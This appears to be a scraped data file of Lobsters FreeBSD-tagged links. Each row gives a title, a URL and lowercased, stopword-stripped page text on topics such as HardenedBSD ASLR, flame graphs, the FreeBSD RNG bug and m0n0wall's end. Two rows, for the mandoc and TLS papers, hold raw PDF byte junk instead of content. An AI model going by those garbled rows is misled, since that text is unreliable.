594,Lobsters,freebsd,FreeBSD,HardenedBSD Completes its ASLR Implementation,https://hardenedbsd.org/article/shawn-webb/2015-07-06/announcing-aslr-completion,hardenedbsd completes aslr implementation,implemented gettimeofday update stack randomization vdso randomization,july weekend implemented randomization vdso virtual dynamic shared object vdso spot memory shared kernel userland memory contains signal trampoline timerelated code like gettimeofday even though amount code small vdso could still theoretically used generate rop gadget removing piece determinism make generating rop gadget based code vdso difficult randomizing vdso last piece address space randomize vdso randomization implemented aslr implementation complete notice new sysctl hardeningpaxaslrvdsolen control amount entropy applied vdso base version aslr strongest form ever implemented bsd operating system aslr implementation feature execution base randomization positionindependent executables pie full stack randomization addition random stack gap rtld base randomization mmap randomization vdso randomization shared object load order randomization still see improvement looking making shared object load order randomization efficient help michael zandi need update aslr manpage need clarify inline comment improvement mostly cosmetic result functionality change update identified fixed couple issue stack randomization vdso randomization implementation stack randomization fix pertains arm architecture reverts bandaid fix done eurobsdcon fix needed anymore true stack randomization vdso randomization fix provides better stability enforces vdso placed stack start address max userland virtual memory address
595,Lobsters,freebsd,FreeBSD,Linode turns 12! Here’s some KVM!,https://blog.linode.com/2015/06/16/linode-turns-12-heres-some-kvm/,linode turn kvm,sign node newsletter virtio vm creation ssh accessibility time account setting,sign node newsletter happy birthday u welp time keep slippin future find turning year old today celebrate kicking next phase linode transition xen kvm making kvm linodes generally available starting today better performance versatility faster booting using identical hardware kvm linodes much faster compared xen example unixbench testing kvm linode scored better xen linode kernel compile kvm linode completed faster compared xen linode kvm much le overhead xen get investment highend processor kvm linodes default paravirtualized supporting virtio disk network driver however also support fully virtualized guest mean run alternative operating system like freebsd bsd plan even window using emulated hardware piix ide also working graphical console gish next week recent study vm creation ssh accessibility time performed cloud linode well average linode create boot ssh availability time second kvm linodes boot much faster seeing take second upgrade linode xen kvm xen linode dashboard see upgrade kvm link right sidebar oneclick migration upgrade linode kvm essentially kvm upgrade mean get much faster linode clicking button set account default kvm new stuff account setting set hypervisor preference kvm new linodes create kvm happen xen linodes new customer new linodes default still get xen xen cease default next week eventually transition xen linodes kvm however likely take quite sweat behalf entire linode team thank past year another enjoy chris
596,Lobsters,freebsd,FreeBSD,BSDCan2015,https://www.youtube.com/playlist?list=PLWW0CjV-TafY0NqFDvD4k31CtnX-CGn8f,,,
597,Lobsters,freebsd,FreeBSD,mandoc: becoming the main BSD manual toolbox,http://www.openbsd.org/papers/bsdcan15-mandoc.pdf,mandoc becoming main bsd manual toolbox,,obj stream stream w z z z z z z z z z gtp endobj obj endobj obj stream c z z z z z z z z z dv p j endstream endobj obj endobj obj stream q endobj obj endobj obj stream ltgo endobj obj endobj obj stream z ղ n rh vvy p endobj obj endobj obj stream c z z z z z z z z z z z z f eg q endobj obj endobj obj stream e z z z z z z z z z z feו n endobj obj endobj obj stream g z z z z z z z z z z j endobj obj endobj obj stream h vjǉ ƈ r j endobj obj endobj obj stream ӷf k v rr endobj obj endobj obj stream qd endobj obj endobj obj stream p
598,Lobsters,freebsd,FreeBSD,Putting FreeBSD on little Wi-Fi router devices,http://adrianchadd.blogspot.com/2015/05/freebsd-wifi-build-or-wait-you-can-run.html,putting freebsd little wifi router device,http githubcomfreebsdfreebsdwifibuildwikisupportedboards http githubcomfreebsdfreebsdwifibuildwiki http githubcomfreebsdfreebsdwifibuildwikiconfigoverview,running freebsd home primary internetwifi access year cheap easy tried hard wrap whole process mostlysimple build system spit useful image use pretty simple concept take freebsdhead build cutdown option create custom filesystem image custom boot script custom configuration file provide image tftp using serial console ethernet cable upload directly ap support supported hardware list http githubcomfreebsdfreebsdwifibuildwikisupportedboards huge list like openwrt mostly nt infinite supply atheros mips based router think get tplink archer series stuff next building pretty simple http githubcomfreebsdfreebsdwifibuildwiki checkout build repo check freebsdhead install couple package run build board done image board appear tftpboot wiki page supported board walkthrough get freebsd going come user root user password first thing installation telnet configure etccfgrcconf actual lan ip set userroot password cfgsave save thing reboot voila configuration file format look like freebsd nt keeping somewhat hierarchicallooking naming flat implementation migrate something like sqlite luci backend future http githubcomfreebsdfreebsdwifibuildwikiconfigoverview good enough able set ap bridge management ip address configure ethernet switch others added ipfw support nat firewalling going add configuration rule nat ipfw routing soon integrated freebsd way uname freebsd freebsd wed may pdt adrian mips ifconfig list sta addr aid chan rate rssi idle txseq rxseq cap flag eps aqehtrm rsn htcap wme eps aqephtr rsn htcap wme eps aqephtr rsn htcap wme eps aqephtr rsn htcap wme eps ae rsn fa eps aqehtrs rsn htcap wme like freebsd based device act home gateway start pfsense designed run thing much smaller pfsense support good introduction world freebsd embedded
599,Lobsters,freebsd,FreeBSD,Subcarpathian BSD User Group,http://www.sbug.org,subcarpathian bsd user group,adam wolk frederic cambus mailinglist sbug sbugpl adama frederica cambusa listy mailingowej sbug sbugpl,welcome subcarpathian bsd user group sbug founded april adam wolk frederic cambus would like thank nyc bug admins kindly hosting mailing list spreading word newly created user group support community amazing far moment trying raise awareness group gather bsd enthusiast subcarpathian voivodeship please help u reach user area join mailinglist interested since december also sbug irc channel freenode lastly follow sbug twitter sbugpl witamy na podkarpackiej grupie bsd sbug w kwietniu roku przez adama frederica cambusa grupie nyc bug jej administratorom za hosting naszej listy mailingowej nowo utworzonej grupy pomoc od bezcenna obecnie staramy na temat istnienia grupy oraz bsd z podkarpackiego nam w swoim obszarze cz naszej listy mailingowej od grudnia roku istnieje sbug w sieci irc freenode sbug na twitterze sbugpl
600,Lobsters,freebsd,FreeBSD,Microsoft .NET Running on FreeBSD 10.1/amd64,https://github.com/dotnet/coreclr/issues/793,microsoft net running freebsd,join github today sign reload reload,dismiss join github today github home million developer working together host review code manage project build software together sign perform action time signed another tab window reload refresh session signed another tab window reload refresh session
601,Lobsters,freebsd,FreeBSD,"Gitorious.org is dead, long live Gitorious.org",https://gitlab.com/snippets/4413,gitoriousorg dead long live gitoriousorg,people,add people discussion proceed caution
602,Lobsters,freebsd,FreeBSD,Optimizing TLS for High–Bandwidth Applications in FreeBSD,https://people.freebsd.org/~rrs/asiabsd_2015_tls.pdf,optimizing tl application freebsd,,obj length filter flatedecode stream w נ zg b v u bp aw x ip px endobj obj type page content r resource r mediabox parent r endobj obj type xobject subtype form bbox formtype matrix resource r length filter flatedecode stream bc ck endobj obj type xobject subtype form formtype ptexfilename classicwebpdf ptexpagenumber ptexinfodict r matrix bbox resource procset pdf imageb imagec imagei xobject r length r filter flatedecode stream xtt mz endobj obj title r producer r creator r creationdate r moddate r keywords r aapl r endobj obj length r type xobject subtype image width height interpolate true colorspace r intent perceptual bitspercomponent filter flatedecode stream v uwjun zv g x
603,Lobsters,freebsd,FreeBSD,A week of pkgsrc #8,https://www.geeklan.co.uk/?p=1812,week pkgsrc,presenting bsdcan year ottawa cross platform packaging pkgsrc mandoc raise patch committed release announced first bulkbuild report sent pkgsrcbulk mailing list opencsw project,month pkgsrc since wrote last post received good news presenting bsdcan year ottawa really stoked looking forward presenting preparation big day speaking different aspect working various eventsmeetings first speaking opportunity oracle solarissig losug past life tomorrow cross platform packaging pkgsrc host running solaris attempt bulkbuilds asked shell access various place landed access solaris sparc omnios shell access solaris host came first quickly found mandoc would build due use mkdtemp dirfd vasprintf whilst attempting setup bulkbuild environment using mkpbulkpbulksh script pkgsrc following mandoc developer regarding issue meant issue fixed ingo schwarze within couple day access solaris via opencsw next release mandoc due summer time contain fix undecided whether back port fix current release solaris host recent patch cluster unsure recent unaffected issue omnios shellsstandalonetcsh package reared head omnios ship tcsh standard shellsstandalonetcsh clobber bulkbuild solution may pkgsrc becomes aware various illumos distros instead treating everything sunos nothing decided definite need discussion bulkbuilds omnios using toolchain published ip release show issue pkgsrc libgomp bundled gcc found gettext cause lot package fail first bulkbuild completed showed possible build package without issue inability build databasessharedmimeinfo due libgomp issue caused package fail large impact issue mentioned package suffer problem resumption bulk building pkgsrc freebsd found lot package would fail package due use flag pax present freebsd version yet address issue package raise patch freebsdcurrent available future version freebsd committed treacle point inclusion freebsd bulk build also resumed third bulkbuild progress host still running first attempt use unprivileged user account lack nullfs support prevents setup parallel run speed process building openbsd extremely useful indicating software pkgsrc effected libressl without put effort integrating libressl pkgsrc first also raised instance copying overlapping buffer destructively using memcpy v memmove fix issue yet committed pending investigation makejobs raised improve performance whilst compiling build environment hosted sun dedicated disk mounted soft writes kernbufcachepercent value bumped release announced figure package indicate darwinpowerpc exceeded binary package built gcc darwin binary package built gcc darwin first bulkbuild report sent pkgsrcbulk mailing list back september show total package could built work required keep position future new version mesalib committed point soon bulkbuild progress sevanmitedu upon completion placing request host wiped setup bulk build getting slower slower suspect ide disk may failing thanks phil stracchino sascha curth opencsw project access host running solaris ian kremlin brandon mercer rodent netbsd access host running openbsd
605,Lobsters,freebsd,FreeBSD,Shill: Scripting with Least Privilege,http://shill.seas.harvard.edu/,shill scripting least privilege,getting started manual freebsd racket github learn shill secure shell scripting language bibtex video computerworld get involved project idea shilldev seasharvardedu developer scott moore christos dimoulas dan king stephen chong shilldev seasharvardedu acknowledgement,principle least privilege say software nt executed authority need get job done unfortunately following principle hard operating system configured script program run anything shill shell scripting language designed make easy follow principle least privilege shill us capability control access script system every shill script come contract describes user run thirdparty script confidence using capabilitybased sandbox shill security guarantee extend even native executables launched script getting started find installation instruction manual find number example script shill source distribution shill run freebsd developed racket check source github learn shill secure shell scripting language scott moore christos dimoulas dan king stephen chong usenix symposium operating system design implementation osdi october bibtex video coverage computerworld get involved would like work shill please see list project idea send u email shilldev seasharvardedu developer shill developed scott moore christos dimoulas dan king stephen chong email u shilldev seasharvardedu acknowledgement research supported air force research laboratory
606,Lobsters,freebsd,FreeBSD,FreeBSD.org and OpenBSD.org get SANCTIONED .RU,https://lists.freebsd.org/pipermail/freebsd-advocacy/2015-April/004534.html,freebsdorg openbsdorg get sanctioned ru,freebsdorg get sanctioned ru cnst freebsdorg http wearesanctionedru information freebsdadvocacy mailing list,freebsdorg get sanctioned ru constantine murenin cnst freebsdorg thu apr utc dear freebsd advocacy chat current doc come attention freebsdorg sanctioned today sanctioned category best server o site sanctioned together freebsdorg openbsdorg providing desktop o netbsdorg powering toaster nginxorg engine x sure mean anyone http wearesanctionedru regardless everyone please keep good work feel free nominate website sanctionedru cheer constantine information freebsdadvocacy mailing list
607,Lobsters,freebsd,FreeBSD,RIP Paul Schenkeveld,http://marc.info/?l=openbsd-misc&m=142772368127870&w=2,rip paul schenkeveld,prev list next list next thread openbsdmisc rip paul schenkeveld henning brauer henning openbsd org quigon bsws de message body prev list next list next thread configure news add list korelogic,prev list next list prev thread next thread list openbsdmisc subject rip paul schenkeveld henning brauer henning openbsd org date messageid quigon bsws de download raw message body sad communicate friend paul schenkeveld passed away recently paul held tutorial asiabsdcon know enjoyed rather lived bsd conference particularily proud eurobsdcon maarssen prime organizer stichting eurobsdcon foundation behind every eurobsdcon since came life aftermath con paul driving force always wanted create community event everybody involved bsds particular always wanted eurobsdcon conference bsdderived operating system fair balanced way desire last least led get foundation board let u remember enthusiasm warm open nature endless desire help possible accomplishment two week ago long private conversation tokyo ca nt believe last time talk lost great friend rest peace paul prev list next list prev thread next thread configure news add list sponsored korelogic
608,Lobsters,freebsd,FreeBSD,EuroBSDcon 2015 Call for Papers,https://2015.eurobsdcon.org/call-for-papers/,eurobsdcon call paper,call paper eurobsdcon â stockholm sweden call talk presentation proposal cfp call tutorial proposal submission important date,call paper eurobsdcon â stockholm sweden eurobsdcon european technical conference user developer bsdbased system conference take place stockholm swedenâ tutorial held thursday friday main conference hotel shorter talk paper program saturday sunday university stockholm call talk presentation proposal periodâ start monday march friday april call talk presentation proposal cfp theâ eurobsdcon program committeeâ inviting bsd developer user toâ submit innovative original talk proposal previously presented european conference topic interest conference include limited application architecture implementation performance security bsdbased operating system well topic concerning economic organizational aspect bsd use presentation expected minute delivered english call tutorial proposal theâ eurobsdcon program committeeâ also inviting qualifiedâ practitioner field submit proposal half full dayâ tutorial topic relevant development implementation use ofâ bsdbased system halfday tutorial expected hour fulldayâ tutorial hour tutorial held english submission proposal sent email toâ submission eurobsdconorg theyâ contain short concise text description wordsâ submission also include short cv speaker anâ estimate expected travel expense please submit proposal asâ separate email important date eurobsdcon program committee accepting talk tutorialâ proposal may speaker informed acceptance continuously acceptance
609,Lobsters,freebsd,FreeBSD,FreeBSD Off-CPU Flame Graphs,http://www.brendangregg.com/blog/2015-03-12/freebsd-offcpu-flame-graphs.html,freebsd offcpu flame graph,background linux perfevents slide freebsd procstat ka svg thread svg improving procstat conclusion freebsd flame graph talk,giving talk freebsd flame graph new technique suggested audience gathering offcpu stack something like see improved included operating system involved using procstat ka gather sleeping thread stack created offcpu flame graph visualization let u browse sleeping thread call stack look anything unusual may problem normal thread usually spend time sleeping waiting work may normal source latency performance issue background cpu profiling help solve performance issue thread oncpu issue thread blocked sleeping offcpu time may spent waiting storage io network io lock contention run queue latency etc collectively call offcpu time profiled examined help solve issue recently showed linux perfevents measure offcpu time create flame graph approach capture kernel scheduler event involved sleeping switching thread trace file us userlevel program stitch together event calculating offcpu time call stack work tracing scheduler event file incur crazyhigh overhead nervous using busy production system improvement calculate offcpu time kernel context pas aggregated call stack total time userlevel need programmable tracer like systemtap linux dtrace freebsd slide talk showed dtrace command still come high overhead warning even though much better perfevents approach offcpu tracing cost overhead relative event rate system million iop million scheduler event per second compare cpu profiling wake fixed rate eg hertz cpu gather stack sample cpu system cpu profiling mean stack sample per second matter busy server million per second offcpu tracing reach profile offcpu time way cpu profiling instead tracing every scheduler event wake timed interval gather sleeping stack oncpu one would mean overhead relative thread count instead scheduler event rate eg sample say hertz system thread would mean taking stack sample per second freebsd procstat ka talk adrian chadd suggested use procstat ka dump sleeping stack thanks procstat ka pid tid comm tdname kstack kernel swapper miswitch sleepqtimedwait sleep swapper btext kernel firmware taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel kqueue taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel ffstrim taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel miswitch sleepqwait msleepspinsbt taskqueuethreadloop forkexit forktrampoline kernel miswitch sleepqwait msleepspinsbt taskqueuethreadloop forkexit forktrampoline kernel miswitch sleepqwait msleepspinsbt taskqueuethreadloop forkexit forktrampoline kernel aiodbio taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel thread taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline kernel taskq miswitch sleepqwait sleep taskqueuethreadloop forkexit forktrampoline wow freebsd already really like linux gdb macro least kstack column show leaf origin call stack need little text processing flamegraphpl example collecting ten generating offcpu flame graph bourne shell git clone depth http githubcombrendangreggflamegraph cd flamegraph seq procstat ka sleep done sed g flamegraphpl colorio title offcpu generates offcpu flame graph demonstrated talk also top page svg click zoom thread since procstat process thread name third fourth field include get bit tricker thread name contain space switching awk awk comm thread substr gsub thread stack substr gsub stack gsub stack printf comm thread stack flamegraphpl colorio title offcpu awk getting bit long put stackcollapseprocstatawk file like profiler output example output including process thread name svg detail splitting time thread name creating many thin tower wider tower mean pool thread thread zfs metaslabgroupt truncated nginx perthread name detail might overdoing many case adjust awk include process name desired improving procstat room improvement procstat first stack kernel would helpful include userlevel frame fully explain blocked event second overhead higher would hoped procstat ka wc l time procstat ka devnull real user sys second system cpu time walk thread wo nt able take even one sample thread per second let alone taking hertz like suggested earlier higher cpu flame graph procstat system cpu time ok linkelfsearchsymbol obvious nt need visualize flame graph syskernlinkelfc static int linkelfsearchsymbol linkerfilet lf caddrt value clinkersymt sym long diffp e ef ddbsymtab ef ddbsymcnt e e stname continue stvalue e stvalue uintptrt void ef address stvalue stvalue diff diff stvalue best e diff break else stvalue diff best e sequential search list symbol also check entire list unless direct match found offset usually wo nt case usually return closest match also called another loop linkerdebugsearchsymbol visible flame graph probably due compiler optimization iterates linker symbol file case searching kernel module largest zfs symbol every frame every stack trace usually compare program counter every known kernel symbol sequentially improved eg using btree lookup least bailing early decent match found another approach could build offcpu profiler kernel sampled aggregated stack symbol lookup many approach possible suspect never reason optimize conclusion freebsd interesting way list blocked thread stack using procstat ka used generate offcpu flame graph post described worked room improvement approach would great see similar facility operating system offcpu flame graph generated cheaper fashion solving issue blocked time flame graph see previous post freebsd flame graph talk
610,Lobsters,freebsd,FreeBSD,FreeBSD Flame Graphs,http://www.brendangregg.com/blog/2015-03-10/freebsd-flame-graphs.html,freebsd flame graph,slideshare youtube cpi flame graph svg slide video freebsd developer vendor summit performance analysis,last freebsd developer vendor summit gave talk flame graph freebsd summarized different type cpu memory disk io offcpu chain graph showed generated freebsd live demo think one best talk far whether care freebsd see visualization used navigate different type profiling data slide slideshare camera room captured talk laptop using screenflow youtube video first time published screenflow think might better nothing demo nt otherwise recorded thanks straughan help editing using flame graph netflix open connect appliance oca understand cpu usage look optimization cpu flame graph also cpi flame graph color indicates cyclesperinstruction cpi show cpu really busy retiring instruction executing code stalled memory io flame graph easy generate given output profiler dtrace pmcstat included command talk example generate kernel cpu flame graph using dtrace sampling kernel stack hertz second git clone http githubcombrendangreggflamegraph download zip cd flamegraph kldload dtraceall needed dtrace x n stack count exit outstacks stackcollapsepl outstacks flamegraphpl outsvg example resulting flame graph svg click zoom generate stall cycle flame graph using pmcstat sampling stack based resource stall pmcstat resourcestallsany outpmcstat sleep pmcstat r outpmcstat g outstacks stackcollapsepmcpl outstacks flamegraphpl outsvg many type possible covered talk automated cpu flame graph generation oca thanks scott created easily also used nonregression analysis done epic flame graph talk usenixlisa slide video lasting minute really two talk one cpu flame graph flame graph type thorough explained everything since hesitated encourage people casual interest watch minute video freebsd dev summit gave tour flame graph type minute really got stuck technical detail fast skipping introduction lot fun perhaps talk like freebsd developer vendor summit talk day performance analysis talk meetbsd ca also recommend watching follow post discus new method creating offcpu flame graph using procstat demoed talk
611,Lobsters,freebsd,FreeBSD,Performance Analysis of BSD,http://www.brendangregg.com/blog/2015-03-06/performance-analysis-bsd.html,performance analysis bsd,meetbsd ca linux slideshare youtube dtracetools playlist,system performance analysis enormous topic challenge know analyzed last meetbsd ca gave talk titled performance analysis discussed five key facet topic observability tool methodology benchmarking profiling tracing recommend talk anyone working bsd family operating system talk created observability tool diagram freebsd linux one printed hung around desk help jog memory especially switching operating system slide talk slideshare talk also videoed thanks ixsystems youtube video apart slide content talk included additional discussion live demo profiling netflix open connect appliance oca stream content even cscope browsing kernel source understand tracing target freebsd advanced performance analysis toolset includes pmcstat cpu performance monitoring counter pmc analysis dtrace static dynamic tracing linux get job done sometimes feel like ca nt get second gear freebsd fly pmcstat came neat diagram pmc group pretty happy turned want improve next time use try highlight frontend v backend stall cycle since useful approach cpu analysis also example developed performance analysis freebsd tried create diagram linux perfevents scale talk lacking many pmc group nt use linux get job done often need use raw pmc counter specification intel manual stuck second gear talk published collection dtrace script dtracetools wrote netflix oca installed default find better home freebsd wiki source talk said written script beforehand measuring storage io size without using dtrace io provider bug translator involving struct type one way instrumenting geom using dynamic tracing dtrace n fbt gdiskstart entry quantize args biolength dtrace description fbt gdiskstart entry matched probe c value distribution count histogram show io fell mbyte bucket explains millisecond minimum latency demo netflix oca tuned streaming workload enjoyed meeting others bsd community meetbsd ca watching talk little surprised welcoming happy relaxed bsd community linux event recently scale exception mood felt bit tense hallway conversation linus attitude whether ok much people hate love systemd thing currently much relaxed bsd land hope like talk check playlist meetbsd ca talk day talk gave another freebsd flame graph describe follow post
612,Lobsters,freebsd,FreeBSD,Massive libxo-zation that breaks everything,https://lists.freebsd.org/pipermail/freebsd-current/2015-March/054821.html,massive libxozation break everything,massive libxozation break everything hotee information freebsdcurrent mailing list,massive libxozation break everything sulevmadis silber ketas hotee sun mar utc hello first would happy json xml output filesystems user route nt like make code df w netstat hard readmaintain often broken nt think would good continue maybe effort put creating new layerlibrary something top actually output json xml difficult maybe regular dfwnetstat could copied somewhere else made code libxooutputonly original dfwnetstat change reverted left alone maybe later dfwnetstat could updated new layerlibrary maybe left would mean two netstat system could good separation bad maintaining idea nt know solve issue fully also likely one would write code hell nt even idea worry system dropin xozation bad overall health base oh make rescue larger complex suggestion maybe create separate first aid kit emergency room type system rescue utilsmethods thanks information freebsdcurrent mailing list
614,Lobsters,freebsd,FreeBSD,freebsd-current RNG broken for last 4 months,https://lists.freebsd.org/pipermail/freebsd-current/2015-February/054580.html,freebsdcurrent rng broken last month,urgent rng broken last month jmg funkthatcom information freebsdcurrent mailing list,urgent rng broken last month johnmark gurney jmg funkthatcom tue feb utc running current kernel later please upgrade kernel later immediately regenerate key discovered issue new framework code calling randomdevinitreader mean readrandom returning good random data readrandom used primary method seeded mean mostall key generated may predictable must regenerated includes limited ssh key key generated openssl purely kernel issue simple kernel upgrade w patch sufficient fix issue johnmark gurney voice done information freebsdcurrent mailing list
615,Lobsters,freebsd,FreeBSD,End of the m0n0wall project,http://m0n0.ch/wall/end_announcement.php,end project,,end project dear enthusiast day year ago released first version public theory one could still run version called suitably old pc use control internet access small lan would recommended securitywise however world keep turning made effort keep better solution available active development therefore today announce project officially ended development done anymore release forum mailing list frozen end month content website repository downloads mailing list forum archived permanent location web remain accessible indefinitely anyone might interested served seed several well known open source project like pfsense freenas askoziapbx newest offspring opnsense http opnsenseorg aim continue open source spirit updating technology ready future view perfect way bring idea encourage current user check opnsense contribute finally would like take opportunity thank everyone involved project helped way another contributing code documentation answering question mailing list forum donating spreading word great journey convinced even come end spirit live various project spawned manuel kasper february
616,Lobsters,freebsd,FreeBSD,Fed up with systemd and Linux? Why not try PC-BSD?,http://www.itwire.com/business-it-news/open-source/66900-fed-up-with-systemd-and-linux?-why-not-try-pc-bsd?,fed systemd linux try pcbsd,pictured pcbsd system running gnome freshports latest kde pcbsd system handbook need something support forum section handbook switching linux user,talk well mean making threat difficult actually make move linux moved far ahead switching system mean one without many application one gotten used itwire spoke kris moore pictured one deeply involved pcbsd project moore also work ixsystems company sell hardware loaded freebsd pcbsd moore said initially understanding pcbsd actually first going reference pcbsd lot need understand pcbsd nt fork per se vanilla freebsd kernelworld unique installation option slew graphical commandline utility make freebsd desktop easy said pretty much everything mention done official freebsd install would require lot manual effort pcbsd desktop quite close linux far endusers perspective concerned moore said first glance may even difficult tell apart almost opensource software available case desktop pcbsd includes box support installing xfce lxde lumen mate cinnamon even niche wms like awesome fvwm ratpoison etc pcbsd system running gnome thing one would forgo unity rest related bsd package addition pcbsd allows install one mix match heart content moore said systemconfig utility rely upon specific desktop function moore said plenty software us release software package available binary package form made possible pkgng freebsd excellent port system great site browse collection freshports freebsd also binary package pcbsd project compiles set use pcbsd desktop mainly enable option metapackages make sense desktop user package collection find application would linux firefox chromium libreoffice gimp plex virtualbox name moore said software collection also included package nonopen source item like adobe flash player included box pcbsd nvidia driver also included others pcbsd world attitude towards binaryonly package agnostic want make many package available endusers possible said user trust smart enough determine want run system case nvidia driver often work system even seen benchmark saying outperforms fps driver linux fullyunderstand enduser would want run latest kde pcbsd system hardware front moore say thing sound wired networking usually work platform stumble bit poor missing driver support wireless device broadcom good example opensource video driver said right intel video missing support haswellbroadwell support landing upcoming release later year amd video driver starting catch amd user ca nt speak specific chipsets using nvidia driver different story anything shelf work asked installation pcbsd moore said usually involved couple click select default minute actual process finish great handbook authored large part dru lavigne bsd book fame help user setup administration system pcbsd caters system need something cpu get started moore said personally recommend dualcore processor memory space nvidia card best experience course see user running often much lesser spec system memory etc also support forum mailing list bug tracker irc like getting touch user even developer relatively easy even section handbook switching linux user want know surface difference linux bsd aspect pcbsd different linux pcbsd us zfs filesystem exclusively special way moore said tied directly update system later use bootenvironments be similar solaris system going begin update instant snapshot taken often le second update actually happens background within chroot environment basically mean keep working update installed since nothing running system messed update prepared user need reboot convenient bootloader load new updated bootenvironment default great thing system something go bad user always pick previous load boot like nothing happened homedirectory critical directory kept separate snapshot even run different version freebsd homedirectory computer advanced user run freebsd currentexperimental code safety knowing reboot back stable release time
618,Lobsters,freebsd,FreeBSD,A Comparative Introduction to FreeBSD for Linux Users | DigitalOcean,https://www.digitalocean.com/community/tutorials/a-comparative-introduction-to-freebsd-for-linux-users,comparative introduction freebsd linux user digitalocean,introduction trait freebsd linux share posixcompliant licensing difference freebsd lineage implication separation core operating system additional software release formed software difference system design supported package source installation vanilla v customized software standard shell stratified filesystem final thought getting started freebsd,introduction freebsd free open source unixlike operating system popular server platform freebsd bsdbased system share much common system like linux point two family diverge important way guide briefly discus commonality freebsd linux moving extended discussion important difference many point accurately applied greater family bsdderived system consequence focus referring mainly freebsd representative family trait freebsd linux share begin examining area freebsd linux differ let discus broad term thing system common specific licensing family employ differs discus later family system free open source user view modify source desire development done open freebsd linuxbased distribution unixlike nature freebsd close root unix system past linux created scratch open unixlike alternative association informs decision design system component interoperate general expectation system look like accomplish common unixlike behavior mainly result family mostly posixcompliant overall feel design system rather standardized use similar pattern filesystem hierarchy similarly divided shell environment primary method interaction system programming apis share similar feature due consideration freebsd linux distribution able share many tool application case dictate version flavor program differ system application ported easily nonunixlike system point mind move discus area two family operating system diverge hopefully commonality help accurately digest information regarding difference licensing difference one fundamental difference freebsd linux system matter licensing linux kernel gnubased application many piece software originating linux world licensed form gpl gnu general public license license often described copyleft license form licensing allows freedom view distribute modify source code demanding derivative work maintain licensing freebsd hand including kernel tool created freebsd contributor license software bsd license license type permissive gpl require derivative work maintain licensing term mean person organization use distribute modify program without need contribute change back release source work creating requirement original copyright copy bsd license included source code documentation depending release method derivative work provided disclaimer limit liability included main license short found appeal licensing type almost entirely dependent upon philosophy need user gpl license promote sharing open ecosystem consideration proprietary software careful rely gplbased software hand bsd licensed software freely incorporated proprietary closed source application make attractive many business individual hoping monetize software possible sell software directly retain source developer tend prefer one licensing philosophy advantage understanding licensing system help u begin understand choice philosophy go development freebsd lineage implication another important difference freebsd linux system lineage history system along licensing difference discussed perhaps largest influencer philosophy camp adheres linux kernel developed linus torvalds mean replacing educationoriented restrictive minix system using university helsinki combined component many coming gnu suite operating system built linux kernel many unixlike property despite directly derived previous unix o since linux started scratch without inherited design choice legacy consideration differ significantly system closer tie unix freebsd many direct tie unix heritage bsd berkeley software distribution distribution unix created university california berkeley extended feature set unix operating system agreeable licensing term later decision made try replace much original operating system possible open source alternative user would required obtain license use bsd eventually component original unix rewritten bsd license ported architecture freebsd forked base effort maintain improve modernize work already eventually rebased incomplete release called bsdlite sake licensing issue lengthy multistage process derivation freebsd became unencumbered term licensing maintained close tie past developer working create system remained invested unix way thing probably freebsd always meant operate openly licensed clone unix root influenced direction development reason behind choice discus separation core operating system additional software key difference term development effort system design freebsd linux distribution scope system freebsd team develops kernel base operating system cohesive unit linux technically refers kernel component coming variety source might seem like small difference actually affect interact manage system linux distribution might bundle together select group package ensuring interoperate together nicely however component come broad array source distribution developer maintainer tasked molding system function correctly sense essential component much different optional package available distribution repository distribution package management tool used track manage component exactly way distribution might maintain different repository based team responsible certain package core development team must worry subset software available organizational focus difference generally result difference software management user perspective contrast freebsd maintains entire core operating system kernel collection software many created freebsd developer maintained unit simple swap component part core collection sense monolithic set software allows freebsd team closely manage main operating system ensuring tight integration predictability software included core operating system considered completely separate component offered optional addition freebsd offer large collection optional software linux distribution managed separately core system updated single unit independently optional software updated individually release formed linux release result gathering software variety source modifying necessary distribution maintainer decide component include installation medium component include distribution maintained repository etc testing component together release containing tested software created last section learned large portion freebsd operating system developed freebsd team base operating system main output produced base software considered cohesive whole quality lead different approach releasing software linux distribution freebsd organizes thing operating system level base component maintained within single source code repository important implication first since tool developed tandem single repository release formed simply selecting revision one branch repository similar way software released stable point selected organized code base since base operating system active version control also mean user track different branch level stability depending welltested want system component user wait developer sanction change get system somewhat similar user tracking different repository organized stability certain linux distribution linux track package repository freebsd track branch centralized source repository software difference system design remaining difference discus related software general quality system supported package source installation one key difference freebsd linux distribution user perspective availability support packaged software source installed software linux distribution provide precompiled binary package distributionsupported software freebsd contains prebuilt package well build system compiling installing source software allows choose precompiled package built reasonable default ability customize software compilation process building freebsd system call port freebsd port system collection software freebsd know build organized hierarchy representing software available within usrports directory user drill directory application directory contain file specify location source file obtained well instruction compiler properly patch source work correctly freebsd packaged version software actually produced port system making freebsd sourcefirst distribution package available convenience system comprised sourcebuilt prepackaged software software management system adequately handle combination two installation method vanilla v customized software one decision might seem bit strange user familiar popular linux distribution freebsd usually opts provide upstream software unmodified ever possible many linux distros make modification software order make easier connect component try make management easier good example tendency restructuring common web server configuration hierarchy make server configuration modular many user find change helpful also drawback approach one issue making modification presumes know approach work best user also make software unpredictable user coming platform diverges upstream convention freebsd maintainer often modify software patch generally conservative change linux distribution package choice general modification software freebsd ecosystem necessary make software build run correctly freebsd environment required define reasonable default configuration file placed filesystem generally heavily modified extra work might need taken get component talk one another another aspect freebsd system might cause confusion linux user availability familiar tool operate slightly differently would linux system freebsd team maintains version large number common tool many tool found linux system gnu suite freebsd often roll variant operating system reason decision since freebsd responsible developing maintaining core operating system controlling development application placing bsd license either essential useful tool also close functional tie bsd unix tool derived unlike gnu suite general tends le backwards compatible difference often manifest option syntax command may used running command certain way linux machine may work freebsd server important always check man page command get familiar option freebsd variant standard shell related point might cause confusion default shell freebsd bash instead freebsd us tcsh default shell shell improved version csh c shell developed bsd bash shell gnu component making poor choice default freebsd shell generally function similar way command line scripting done tcsh using basic bourne shell sh reliable avoids welldocumented pitfall associated tcsh csh scripting also worth noting simple change shell bash comfortable environment stratified filesystem mentioned several time freebsd distinguishes base operating system optional component port installed top layer implication freebsd organizes component file structure linux executables typically located bin sbin usrsbin usrbin directory depending purpose essential core functionality freebsd recognizes difference also imposes another level separation component installed part base system installed port base system software resides one directory program installed port package placed within usrlocalbin usrlocalsbin usrlocal directory contains directory structure mostly mirror structure found usr directory main root directory software installed port system almost 